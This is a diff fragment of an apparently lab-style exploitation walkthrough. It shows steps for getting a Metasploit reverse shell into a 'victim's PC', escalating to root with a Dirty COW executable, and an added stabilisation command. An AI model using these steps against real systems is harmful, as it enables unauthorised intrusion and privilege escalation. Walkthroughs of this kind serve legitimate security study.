@@ -40,3 +40,4 @@ For some weird reason, I couldn't access the STDIN of the root shell created by 
 14. `set LHOST 10.8.0.1` This is the default Server IP set by OpenVPN
 15. `exploit` Now you should have a reverse shell into the victim's PC.
 16. To obtain root, cd into tmp directory and run the dirtycow executable. You should now be elevated into root privileges
+17. To ensure that the system is stable after root is gained, `echo 0 > /proc/sys/vm/dirty_writeback_centisecs`
